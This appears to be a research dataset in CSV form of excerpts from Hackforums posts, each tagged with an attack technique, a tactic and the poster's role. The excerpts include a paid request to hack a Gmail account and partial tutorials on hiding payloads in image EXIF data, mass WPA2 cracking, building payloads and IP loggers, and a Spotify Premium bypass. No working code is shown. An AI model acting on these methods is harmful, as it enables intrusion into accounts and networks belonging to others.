Topic,Technique,Tactic,Role,Thread,Content
Gmail account hack will play for it,"Drive-by compromise, Valid Accounts",Initial Access,Buyer,https://hackforums.net/showthread.php?tid=6105591,Hello looking for someone to hack a gmail account and i will pay for this job
[Hack Mac/Linux] Concealing payloads inside image metadata,Obfuscated files or information,Defense evasion,Author,https://hackforums.net/showthread.php?tid=6105744,"In this tutorial, I will teach you how to hide malicious commands inside an image's EXIF data. The attacker can post the picture to a public whitelisted photo-sharing website to evade firewall detection so that everyone can download it. We will also build a stager is used to download and extract the embedded code within the images EXIF data and run our command on the target machine."
How to make your own .exe installer with 7zip,Develop capabilities,Resource development,Author,https://hackforums.net/showthread.php?tid=6104711,"1) Go and get your copy of 7zip: https://www.7-zip.org/ 2) Create you directory and insert all your file you wish for you installer to have, then right click your folder and select ""Add to archive"". Spoiler (Click to View) 3) Now you will be greeted with the these options, enable ""Create SFX archive"" and click OK. Spoiler (Click to View) 4) The self-extracting 7zip file will be created, you're now basically finished. BUT there's more. Spoiler (Click to View) This step is optional, download http://www.angusj.com/resourcehacker/. Open your .exe with this tool and change the icon, you can even change the strings to your liking. For example: the Extract, to Install instead and even the title of the window"
How to clone a website,Develop capabilities,,Author,https://hackforums.net/showthread.php?tid=6104513,"This is a tutorial on how to clone a website, you might find this useful for various hacking related things. We'll be using a program called HTTrack, which you can find and download here: https://www.httrack.com/ 1) Once downloaded and installed, open up the program and you'll be greeted with this GUI. Click Next. Spoiler (Click to View) 2) In the next step, choose a project name. You may also categorize or change the file location to your liking. Click Next again. Spoiler (Click to View) 3) Now enter the URL of the website you wish to clone. In my case: https://www.httrack.com/, click Next again. Spoiler (Click to View) 4) You will then be taken to the last window, where you can set additional options like: shutting down or disconnecting when finished downloading. Just leave everything to default and click Finish. Spoiler (Click to View) 5) It will now start downloading everything from the URL, when it's finished it will look like this: Spoiler (Click to View) Now go to wherever you saved your clone website and check it out! ✌ Mine turned out like this"
How to portforward with uTorrent,"Develop capabilities, Obtain capabilities",,Author,https://hackforums.net/showthread.php?tid=6105140,") First you need to download the program uTorrent Classic, you can get it from here: https://www.utorrent.com/ 2) Once installed, open up and you will be greeted with this window: Spoiler (Click to View) 3) Then in the top menu go into: Options > Preferences > Connection. Set the port you wish to portforward in the field I marked on the image below. Spoiler (Click to View) And that's it! Just remember to keep uTorrent open at all times for when you want the port to be opened."
Turn any Spotify Account into a Premium Account! | Up To Date | Guide,Abuse elevation control mechanism,,Author,https://hackforums.net/showthread.php?tid=5997145,"The options for obtaining a premium Spotify account are far from limited, and Google does little to hide those search results to the average user. Personally not being a fan of ""Patched"" software, or buying ""Black-Market"" premium accounts, I was surprised that not more people use the simple method of Host-File blocking. What are : ("" Host Files ""); The hosts file is used in an operating system to map hostnames to IP addresses. The hosts file is a plain-text file and is traditionally named hosts. For various reasons it may be necessary to update the hosts file on your computer to properly resolve a web site by its domain name. In our case, we will reroute the correct domains to a local IP address. A Home-made Ad blocker!"
[TUT] How to make pentesting a bit easier.,Develop capabilities,,Author,https://hackforums.net/showthread.php?tid=6105058,"Hello fellow members reading this thread. Today we will take a look of tool called Sn1per. Actually it includes many tools (nmap, Metasploit, WAFWOOF, nikto and other.) 1N3 has made amazing script for automation. So the tools automatically lauch and interact with the information provided from other tools. Also a huge plus is that Sn1per can be installed on Docker."
[TUT] SQLMap Usage,Develop capabilities,,Author,https://hackforums.net/showthread.php?tid=6105055,"SQLmap is a powerful tool to exploit SQLi vulnerabilities, the basic usage is explained in this tutorial."
[TUT] Hacking a WiFi Network with Kali Linux.,"Develop capabilities, Hijack execution flow",,Author,https://hackforums.net/showthread.php?tid=6105042,"In this short tutorial I will show you how to hack any wifi that isn't WPS locked. You will need : - Kali Linux or any linux OS with aircrack-ng and reaver/bully installed. - Wifi card that supports monitor mode. First off, load up a terminal and type ""ifconfig"""
Vulnerability Scanning with Vega,Develop capabilities,,Author,https://hackforums.net/showthread.php?tid=6104040,"Vega is a free and open source scanner and testing platform to test the security of web applications. Vega can help you find and validate SQL Injection, Cross-Site Scripting (XSS), inadvertently disclosed sensitive information, and other vulnerabilities. It is written in Java, GUI based, and runs on Linux, OS X, and Windows."
[TUT] How to find mailserver for any webmail/smtp,Develop capabilities,,Author,https://hackforums.net/showthread.php?tid=6104908,In this tutorial I am going to show you how you can find mailserver for any webmail/smtp! Let's get started.
[TUT] Create a simple payload.,Develop capabilities,,Author,https://hackforums.net/showthread.php?tid=6104903,"In this tutorial I am going to show you how you can easily create Payloads. Let's get started. Part 1: Install MSFPC First of all, I would recommend using Kali Linux or Parrot OS as OS, but you can use what you want. To get started you will need a program called MSFPC, and if you are running Kali Linux or Parrot it is included in the repo's. Just write"
[TUT] How to Get Direct Download Link via ge.tt,"Develop capabilities, Obtain capabilities",,Author,https://hackforums.net/showthread.php?tid=6104901,"1st: Go to, http://ge.tt. 2nd: Click the ""Upload files"" button. 3rd: Select the file that you would like to upload. 4th: The file will be uploaded, and you should see a page that looks like this. 5th: Right click the words, ""Download"", and click, ""Copy link address"". You now have the direct download link of the file. Use the link as needed. If you go to the link that you copied in your browser, it should start downloading automatically. No clicking of a button. Hope this is easy to follow for most people. There has been a lot of questions about, ""how to get a direct download link of a file from certain sites."" This tutorial will show you how to get the direct download link."
Netflix Recording,"Trusted relationship, Valid accounts",,Author,https://hackforums.net/showthread.php?tid=6104859,Hello there. I'm looking forward on starting a youtube channel with clips from popular movies and serials but i don't know any method of recording or saving the movies so i can cut them into separate scenes and upload them. Does anybody know any meth
hacking forums,Develop capabilities,,Information Seeker,https://hackforums.net/showthread.php?tid=6096576,can anyone recommend sites why one can purely learn hacking.
FREE - eLearnSecurity Courses Download [NO CREDITS],Develop capabilities,,Author,https://hackforums.net/showthread.php?tid=6103822,Just made a website having the Links for some eLearnSecurity Courses. These are the Courses available: 1. eLearnSecurity Web Application Penetration Testing v2 2. eLearnSecurity Penetration Testing eXtreme Version 1 3. eLearnSecurity Threat Hunting Professional 4. eLearnSecurity Practical Web Defense 5. eLearnSecurity Reverse Engineering Professional or Advanced Reverse Engineering of Software 6. eLearnSecurity Mobile Application Security and Penetration Testing v2
DownloaderBuilder url binder,Obtain capability,,Author,https://hackforums.net/showthread.php?tid=6073961,"friends watch a different binder method video,Allows you to update your server continuously if you have your own ftp"
I need help with wifi hack,"Obtain capability, Drive by compromise",,Information Seeker,https://hackforums.net/showthread.php?tid=6098382,"hi, i'm a poor guy this week we went on vacation where they have a terribly slow wifi but i noticed that there is 1 wifi passworded around so it will probably be faster. Is there an expert who would advise me how to hack wifi?"
Method of silently opening browser in webpage?,"Develop capabilities, Hijack execution flow",,Information Seeker,https://hackforums.net/showthread.php?tid=6103265,Would it be better to code something in C/C++ that does this or make a simple script? Or use a cmd/bat command? Looking for a pointer where I should look to learn how to make this
Mass hacking your local town / WPA2 wardrive hacking.,"Exploit public facing application, Drive by compromise",,Author,https://hackforums.net/showthread.php?tid=5989186,Quick guide on mass hacking your local town. This attack will provide you with WPA2 keys for a lot of networks in your city/town extremely easily. It doesn't rely on getting a 4way handshake and uses PMKIDs
I can make my own ip logger url with a 1 minute's investment.,"Develop capabilities, Phishing, External Remote Services",,Author,https://hackforums.net/showthread.php?tid=6101403,"A minute is too much time. In fact, it took me less than a minute. See how you can do it below."
[TUTORIAL - Advanced] - How to host a python3 server and go for PrivEsc!,Obtain capability,,Author,https://hackforums.net/showthread.php?tid=6102531,How to host a python3 server and go for PrivEsc!
How to trace IP adresses or websites to a location.,"Develop capabilities, Phishing, External Remote Services",,Author,https://hackforums.net/showthread.php?tid=6102509,"Hello, In this tutorial i will show you how to get the IP adress of a website and how to trace it to it's original location. Just to say, this location is not really exact. It wont give you a specific adress. But it's still a pretty cool thing. The first thing you want to do is open Command Prompt, every PC has this. Just press the windows button and type ''cmd'' in the search bar. Once you opened it, you want to type this: ""tracert Websites name."" So for example : tracert www.youtube.com Just wait untill that has loaded and use the LAST Ip that it shows. Then you want to go to this website: http://www.ip-adress.com/ip_tracer/ OR http://cqcounter.com/whois/ Enter the IP in the search bar and press enter. This should give you a location. And your done. As i said this is really nooby and simple but .. i tried."
